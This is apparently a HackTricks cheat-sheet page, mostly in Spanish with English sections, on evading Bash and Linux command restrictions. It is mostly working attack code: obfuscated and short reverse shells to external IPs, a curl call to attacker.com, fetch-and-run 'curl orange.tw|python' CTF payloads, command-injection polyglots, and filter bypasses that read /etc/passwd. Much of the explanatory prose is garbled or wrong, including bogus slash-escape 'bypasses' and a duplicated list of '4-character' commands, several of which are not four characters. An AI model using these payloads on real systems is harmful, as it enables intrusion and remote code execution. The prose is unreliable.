# Saltar Restricciones en Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Saltos Comunes de Limitaciones

### Shell Inverso
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Shell inversa corta

Una shell inversa corta es una técnica utilizada en hacking para establecer una conexión remota a través de una shell inversa en un sistema comprometido. Esto permite al atacante obtener acceso y control total sobre el sistema comprometido.

La siguiente es una implementación básica de una shell inversa corta en Bash:

```bash
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

En este ejemplo, la shell inversa se establece redirigiendo la entrada y salida estándar a través de un socket TCP en la dirección IP `10.0.0.1` y el puerto `1234`. Esto permite al atacante interactuar con el sistema comprometido a través de comandos Bash.

Es importante tener en cuenta que esta técnica puede ser detectada por sistemas de seguridad y firewalls, por lo que se recomienda utilizar técnicas más avanzadas y sigilosas para evitar ser detectado.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Bypass de rutas y palabras prohibidas

Cuando se realiza una prueba de penetración en un sistema Linux, es posible encontrarse con restricciones de seguridad que limitan el acceso a ciertos directorios o palabras clave. Sin embargo, existen formas de eludir estas restricciones utilizando comandos específicos de Linux.

#### Bypass de rutas

Si se encuentra con una restricción que impide el acceso a un directorio específico, puede intentar eludirla utilizando una ruta alternativa. A continuación se muestra un ejemplo de cómo hacerlo:

```bash
cd /home/user/../restricted_directory
```

En este ejemplo, se utiliza `..` para retroceder un nivel en la jerarquía de directorios y luego acceder al directorio restringido. Esto puede funcionar si la restricción se basa en la ruta absoluta del directorio.

#### Bypass de palabras prohibidas

En algunos casos, es posible que se le impida ejecutar comandos que contengan ciertas palabras clave. Sin embargo, puede intentar eludir esta restricción utilizando sinónimos o comandos alternativos. Aquí hay un ejemplo:

```bash
cat /etc/passwd | grep -v "restricted_word"
```

En este ejemplo, se utiliza el comando `grep` con la opción `-v` para excluir cualquier línea que contenga la "palabra restringida". Esto puede permitirle obtener información o ejecutar comandos que de otro modo estarían prohibidos.

Es importante tener en cuenta que eludir restricciones de seguridad puede ser ilegal y solo debe hacerse con el permiso explícito del propietario del sistema.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Bypassar espacios prohibidos

Sometimes, when trying to execute a command that contains spaces, the system may interpret it as multiple commands or arguments. This can lead to errors or restrictions being imposed on the execution of certain commands.

To bypass these restrictions, you can use the following techniques:

1. **Quoting**: Enclose the command or argument containing spaces within single quotes (' ') or double quotes (" "). This will ensure that the entire command or argument is treated as a single entity.

   Example:
   ```
   $ ls 'file with spaces.txt'
   ```

2. **Escape characters**: Use the backslash (\) character to escape the spaces within the command or argument. This tells the system to treat the spaces as part of the command or argument, rather than as separators.

   Example:
   ```
   $ ls file\ with\ spaces.txt
   ```

3. **Wildcards**: Utilize wildcards, such as the asterisk (*) or question mark (?), to represent the spaces within the command or argument. This allows the system to match any character in place of the wildcard.

   Example:
   ```
   $ ls file*with*spaces.txt
   ```

By employing these techniques, you can bypass restrictions on spaces and successfully execute commands that contain spaces.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Bypassar barra invertida y barra diagonal

En algunos casos, es posible que te encuentres con restricciones en el uso de barras invertidas (`\`) y barras diagonales (`/`) al realizar tareas de hacking. Sin embargo, existen formas de eludir estas restricciones y lograr tus objetivos.

#### Bypassar barras invertidas

Si te encuentras con una restricción en el uso de barras invertidas, puedes intentar utilizar la secuencia de escape `\\` para representar una sola barra invertida. Esto engañará al sistema y permitirá que se interprete correctamente.

Por ejemplo, si necesitas ejecutar un comando que contiene una barra invertida, puedes escribirlo de la siguiente manera:

```
comando\\con\\barra\\invertida
```

De esta manera, el sistema interpretará `\\` como una sola barra invertida y ejecutará el comando correctamente.

#### Bypassar barras diagonales

Si te encuentras con una restricción en el uso de barras diagonales, puedes intentar utilizar la secuencia de escape `\/` para representar una sola barra diagonal. Esto permitirá que el sistema interprete correctamente la barra diagonal.

Por ejemplo, si necesitas acceder a un directorio que contiene una barra diagonal en su nombre, puedes escribirlo de la siguiente manera:

```
ruta\/con\/barra\/diagonal
```

De esta manera, el sistema interpretará `\/` como una sola barra diagonal y podrás acceder al directorio correctamente.

Recuerda que estas técnicas pueden variar dependiendo del sistema operativo y la configuración específica. Es importante probar diferentes enfoques y adaptarlos a tu situación particular.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Bypassar tuberías

Las restricciones de Bash a veces pueden dificultar el uso de ciertos comandos o técnicas de hacking. Sin embargo, hay formas de eludir estas restricciones y aprovechar al máximo las tuberías en Bash.

Una forma común de eludir las restricciones de Bash es utilizando el comando `sh`. Puedes usar `sh` para ejecutar comandos en un subshell y luego redirigir la salida a través de una tubería. Aquí tienes un ejemplo:

```bash
sh -c 'comando1 | comando2'
```

En este ejemplo, `comando1` se ejecuta en un subshell utilizando `sh -c`, y luego su salida se redirige a `comando2` a través de la tubería.

Otra forma de eludir las restricciones de Bash es utilizando el comando `eval`. `eval` evalúa y ejecuta una cadena como si fuera un comando. Puedes usar `eval` para ejecutar comandos que contengan tuberías. Aquí tienes un ejemplo:

```bash
eval "comando1 | comando2"
```

En este ejemplo, la cadena `"comando1 | comando2"` se evalúa y se ejecuta como un comando, lo que permite el uso de tuberías.

Recuerda que eludir las restricciones de Bash puede ser riesgoso y debe hacerse con precaución. Asegúrate de comprender completamente los comandos que estás ejecutando y las implicaciones de seguridad asociadas.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Bypass con codificación hexadecimal

A veces, los sistemas pueden tener restricciones que impiden la ejecución de ciertos comandos en Bash. Sin embargo, es posible eludir estas restricciones utilizando la codificación hexadecimal.

La codificación hexadecimal es un método que convierte caracteres en su representación hexadecimal. Esto significa que cada carácter se representa por dos dígitos hexadecimales.

Para utilizar la codificación hexadecimal y eludir las restricciones de Bash, sigue estos pasos:

1. Encuentra el comando que deseas ejecutar en Bash.
2. Convierte cada carácter del comando en su representación hexadecimal utilizando una tabla de conversión hexadecimal.
3. Reemplaza cada carácter del comando con su representación hexadecimal.
4. Ejecuta el comando codificado en Bash.

Aquí tienes un ejemplo para ilustrar cómo funciona:

Supongamos que queremos ejecutar el comando `ls -la` en Bash, pero hay una restricción que impide la ejecución de comandos que contengan la palabra "ls". Podemos eludir esta restricción utilizando la codificación hexadecimal.

1. Convertimos cada carácter del comando en su representación hexadecimal:

   - `l` se convierte en `\x6c`
   - `s` se convierte en `\x73`
   - `-` y `a` no necesitan ser convertidos, ya que no están restringidos.

2. Reemplazamos cada carácter del comando con su representación hexadecimal:

   El comando `ls -la` se convierte en `\x6c\x73 -la`.

3. Ejecutamos el comando codificado en Bash:

   ```bash
   $ echo -e "\x6c\x73 -la"
   ```

Al utilizar la codificación hexadecimal, hemos eludido la restricción y logrado ejecutar el comando `ls -la` en Bash.

Recuerda que la codificación hexadecimal solo es efectiva para eludir restricciones específicas de caracteres o palabras. No garantiza eludir todas las restricciones de seguridad.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Bypass IPs

#### Introduction

In some cases, you may encounter restrictions that prevent you from accessing certain IP addresses. However, there are ways to bypass these restrictions and gain access to the blocked IPs. This section will cover some useful Linux commands that can help you achieve this.

#### Method 1: Using Proxychains

Proxychains is a tool that allows you to redirect network connections through proxy servers. By configuring Proxychains to use a proxy server located outside the restricted network, you can bypass IP restrictions. Here's how you can use Proxychains:

1. Install Proxychains by running the following command:
```bash
sudo apt-get install proxychains
```

2. Edit the Proxychains configuration file using a text editor:
```bash
sudo nano /etc/proxychains.conf
```

3. Uncomment the line that starts with `dynamic_chain` by removing the `#` symbol at the beginning of the line.

4. Add the IP address and port of the proxy server you want to use. You can do this by adding the following line to the configuration file:
```bash
socks5  <proxy_ip_address>  <proxy_port>
```

5. Save the changes and exit the text editor.

6. Now, you can use Proxychains to run commands and applications that will be redirected through the proxy server. For example, to run the `ping` command through the proxy, use the following syntax:
```bash
proxychains ping <target_ip_address>
```

#### Method 2: Using SSH Tunneling

SSH tunneling allows you to create an encrypted tunnel between your local machine and a remote server. By forwarding traffic through this tunnel, you can bypass IP restrictions. Here's how you can use SSH tunneling:

1. Open a terminal and run the following command to create an SSH tunnel:
```bash
ssh -D <local_port> <username>@<remote_server>
```
Replace `<local_port>` with the port number you want to use for the tunnel, `<username>` with your username on the remote server, and `<remote_server>` with the IP address or hostname of the remote server.

2. Enter your password when prompted.

3. Once the tunnel is established, you can configure your applications to use the tunnel as a proxy. For example, you can configure your web browser to use the tunnel by setting the proxy settings to `localhost` and the `<local_port>` you specified in the previous step.

4. Now, any traffic sent through the tunnel will be forwarded to the remote server and appear to originate from that IP address, bypassing any IP restrictions.

#### Conclusion

By using Proxychains or SSH tunneling, you can bypass IP restrictions and gain access to blocked IPs. These methods can be useful in various scenarios, such as accessing restricted websites or services. However, it's important to note that bypassing IP restrictions may be against the terms of service or local laws, so use these techniques responsibly and ethically.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Exfiltración de datos basada en el tiempo

La exfiltración de datos basada en el tiempo es una técnica utilizada para extraer información de un sistema comprometido de forma encubierta y gradual, evitando así la detección. En lugar de enviar grandes cantidades de datos de una sola vez, esta técnica divide la información en pequeñas partes y la envía en intervalos de tiempo específicos.

#### Comandos útiles de Linux para eludir restricciones de Bash

A continuación se presentan algunos comandos útiles de Linux que se pueden utilizar para eludir las restricciones de Bash y llevar a cabo la exfiltración de datos basada en el tiempo:

1. **sleep**: El comando `sleep` se utiliza para pausar la ejecución de un script durante un período de tiempo especificado. Puede ser utilizado para establecer intervalos de tiempo entre la exfiltración de datos.

   ```bash
   sleep <segundos>
   ```

2. **date**: El comando `date` muestra la fecha y hora actual del sistema. Puede ser utilizado para registrar el tiempo de exfiltración de datos.

   ```bash
   date
   ```

3. **ping**: El comando `ping` se utiliza para enviar paquetes de datos a una dirección IP específica. Puede ser utilizado para enviar datos en pequeñas partes a través de la exfiltración de datos basada en el tiempo.

   ```bash
   ping -c 1 <dirección_IP>
   ```

4. **curl**: El comando `curl` se utiliza para transferir datos desde o hacia un servidor utilizando varios protocolos. Puede ser utilizado para enviar datos a través de solicitudes HTTP en la exfiltración de datos basada en el tiempo.

   ```bash
   curl -X POST -d "<datos>" <URL>
   ```

Estos comandos pueden ser utilizados de manera creativa y combinados con otras técnicas para llevar a cabo la exfiltración de datos basada en el tiempo de manera efectiva y encubierta. Es importante tener en cuenta que el uso de estas técnicas puede ser ilegal y solo debe realizarse con el permiso adecuado y para fines legítimos, como pruebas de penetración autorizadas.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Obteniendo caracteres de las variables de entorno

En algunas situaciones, es posible que te encuentres con restricciones en el intérprete de comandos Bash que te impidan ejecutar ciertos comandos o acceder a ciertos archivos. Sin embargo, aún puedes obtener información valiosa utilizando los caracteres almacenados en las variables de entorno.

Aquí hay un ejemplo de cómo puedes hacerlo:

```bash
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

En este caso, la variable de entorno `$PATH` contiene múltiples rutas separadas por dos puntos (`:`). Puedes utilizar el comando `cut` para extraer cada una de estas rutas por separado:

```bash
$ echo $PATH | cut -d ":" -f 1
/usr/local/sbin
$ echo $PATH | cut -d ":" -f 2
/usr/local/bin
$ echo $PATH | cut -d ":" -f 3
/usr/sbin
...
```

De esta manera, puedes obtener información sobre las rutas almacenadas en la variable de entorno `$PATH`. Ten en cuenta que este enfoque también se puede aplicar a otras variables de entorno que contengan información relevante.

Recuerda que siempre debes utilizar esta técnica de manera ética y legal, y solo en sistemas en los que tengas permiso para hacerlo.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Exfiltración de datos DNS

Podrías usar **burpcollab** o [**pingb**](http://pingb.in) por ejemplo.

### Funciones internas

En caso de que no puedas ejecutar funciones externas y solo tengas acceso a un **conjunto limitado de funciones internas para obtener RCE**, hay algunos trucos útiles para hacerlo. Por lo general, **no podrás usar todas** las **funciones internas**, así que debes **conocer todas tus opciones** para intentar evadir la restricción. Idea de [**devploit**](https://twitter.com/devploit).\
En primer lugar, verifica todas las [**funciones internas del shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Luego, aquí tienes algunas **recomendaciones**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Inyección de comandos políglota

La inyección de comandos políglota es una técnica utilizada para evadir las restricciones de Bash y ejecutar comandos arbitrarios en un sistema. Esta técnica se basa en aprovechar las diferencias en la interpretación de comandos entre diferentes lenguajes de programación.

Un ejemplo común de inyección de comandos políglota es el uso de la función `eval()` en lenguajes como PHP o Python. Esta función permite ejecutar código arbitrario como si fuera parte del programa en sí. Al combinar esta función con la sintaxis de comandos de Bash, es posible ejecutar comandos en el sistema objetivo.

Aquí hay un ejemplo de inyección de comandos políglota utilizando la función `eval()` en PHP:

```php
<?php
$payload = "'; echo 'Command executed'; //";
eval($payload);
?>
```

En este ejemplo, el comando `echo 'Command executed'` se ejecutará en el sistema objetivo. El punto y coma al principio del payload se utiliza para cerrar cualquier comando anterior que se esté ejecutando y evitar errores de sintaxis.

Es importante tener en cuenta que la inyección de comandos políglota puede ser peligrosa y debe utilizarse con precaución. Los sistemas deben estar debidamente protegidos para evitar este tipo de ataques.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Bypassar posibles regexes

A veces, al intentar ejecutar comandos en un sistema Linux, puedes encontrarte con restricciones que utilizan expresiones regulares (regexes) para filtrar o bloquear ciertos caracteres o patrones. Sin embargo, existen formas de eludir estas restricciones y ejecutar comandos de todos modos.

Aquí hay algunos métodos comunes para evitar las restricciones basadas en regexes:

1. **Usar caracteres de escape**: Puedes utilizar caracteres de escape, como la barra invertida (\), para evitar que los caracteres sean interpretados como parte de una expresión regular. Por ejemplo, si una restricción bloquea el carácter punto (.), puedes usar el comando `ls \.` para listar los archivos que comienzan con un punto.

2. **Utilizar comillas**: Las comillas simples ('') o dobles ("") pueden ayudarte a evitar que los caracteres sean interpretados como parte de una expresión regular. Por ejemplo, si una restricción bloquea el carácter asterisco (*), puedes usar el comando `ls '*'` para listar los archivos que contienen un asterisco en su nombre.

3. **Cambiar el orden de los caracteres**: A veces, cambiar el orden de los caracteres puede evitar que sean detectados por una expresión regular. Por ejemplo, si una restricción bloquea el carácter punto y coma (;), puedes intentar ejecutar el comando `ls ;echo "Hello"` para listar los archivos y mostrar el mensaje "Hello" al mismo tiempo.

Recuerda que eludir restricciones basadas en regexes puede ser considerado un comportamiento no autorizado y puede tener consecuencias legales. Solo debes utilizar estos métodos con fines educativos y éticos, y siempre obtener el permiso adecuado antes de realizar cualquier prueba de penetración.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator es una herramienta que se utiliza para ofuscar scripts de Bash con el objetivo de evadir restricciones y evitar la detección. Esta herramienta reescribe el código de Bash de manera que sea más difícil de entender y analizar para los sistemas de seguridad.

El Bashfuscator utiliza técnicas como la ofuscación de variables, la mezcla de caracteres y la inserción de código adicional para dificultar la comprensión del script. Esto puede ayudar a evitar la detección de patrones y a eludir las restricciones impuestas por los sistemas de seguridad.

Es importante tener en cuenta que el Bashfuscator no garantiza una protección completa contra la detección y el análisis de scripts de Bash. Sin embargo, puede ser una herramienta útil en ciertos escenarios donde se requiere evadir restricciones y mantener la confidencialidad de un script.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE con 5 caracteres

En algunos casos, cuando se enfrenta a restricciones de Bash, puede ser necesario encontrar una forma de ejecutar comandos remotos (RCE) utilizando solo 5 caracteres. Aquí hay una técnica que puede ayudar:

```bash
$ echo $0
bash
$ exec 5<>/dev/tcp/127.0.0.1/1337
$ cat <&5 | while read line; do $line 2>&5 >&5; done
```

Este código establece una conexión TCP con la dirección IP `127.0.0.1` en el puerto `1337`. Luego, redirige la entrada y salida estándar del descriptor de archivo 5 al comando `cat`, que lee los comandos enviados a través de la conexión TCP. Cada línea leída se ejecuta utilizando la sintaxis `$line 2>&5 >&5`, lo que permite la ejecución remota de comandos.

Para utilizar esta técnica, simplemente reemplace la dirección IP y el puerto con los correspondientes a su caso de uso. Tenga en cuenta que esta técnica puede no funcionar en todas las configuraciones y puede estar sujeta a restricciones adicionales.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE con 4 caracteres

En algunos casos, cuando se enfrenta a restricciones de Bash, puede ser útil conocer comandos que se pueden ejecutar con solo 4 caracteres. Estos comandos pueden ser útiles para lograr la ejecución remota de código (RCE) en situaciones en las que se restringe el uso de ciertos caracteres o comandos.

A continuación se muestra una lista de comandos de 4 caracteres que se pueden utilizar para el RCE:

- `echo`: Imprime un mensaje en la salida estándar.
- `true`: Devuelve un estado de éxito.
- `false`: Devuelve un estado de error.
- `read`: Lee una línea de entrada y la asigna a una variable.
- `exec`: Ejecuta un comando en el mismo proceso.
- `kill`: Envía una señal a un proceso.
- `test`: Evalúa una expresión y devuelve un estado de éxito o error.
- `wait`: Espera a que finalicen los procesos secundarios.
- `time`: Mide el tiempo de ejecución de un comando.
- `trap`: Captura y maneja señales.
- `exit`: Termina el script actual o el proceso actual.
- `jobs`: Muestra los trabajos en segundo plano.
- `bg`: Pone un trabajo en segundo plano.
- `fg`: Pone un trabajo en primer plano.
- `set`: Establece opciones de shell.
- `env`: Muestra las variables de entorno.
- `pwd`: Muestra el directorio actual.
- `cd`: Cambia el directorio actual.
- `umask`: Establece los permisos predeterminados para nuevos archivos y directorios.
- `nice`: Ejecuta un comando con una prioridad de programación ajustada.
- `kill`: Envía una señal a un proceso.
- `time`: Mide el tiempo de ejecución de un comando.
- `wait`: Espera a que finalicen los procesos secundarios.
- `trap`: Captura y maneja señales.
- `exit`: Termina el script actual o el proceso actual.
- `jobs`: Muestra los trabajos en segundo plano.
- `bg`: Pone un trabajo en segundo plano.
- `fg`: Pone un trabajo en primer plano.
- `set`: Establece opciones de shell.
- `env`: Muestra las variables de entorno.
- `pwd`: Muestra el directorio actual.
- `cd`: Cambia el directorio actual.
- `umask`: Establece los permisos predeterminados para nuevos archivos y directorios.
- `nice`: Ejecuta un comando con una prioridad de programación ajustada.

Estos comandos pueden ser útiles en situaciones en las que se necesita ejecutar código en un entorno restringido de Bash. Sin embargo, es importante tener en cuenta que la efectividad de estos comandos puede depender de las restricciones específicas del entorno y de los permisos del usuario.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Bypass de Restricciones de Solo Lectura/Noexec/Distroless

Si te encuentras dentro de un sistema de archivos con las protecciones de solo lectura y noexec, o incluso en un contenedor distroless, aún existen formas de ejecutar binarios arbitrarios, ¡incluso una shell!:

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Bypass de Chroot y otras Jaulas

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Referencias y Más

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
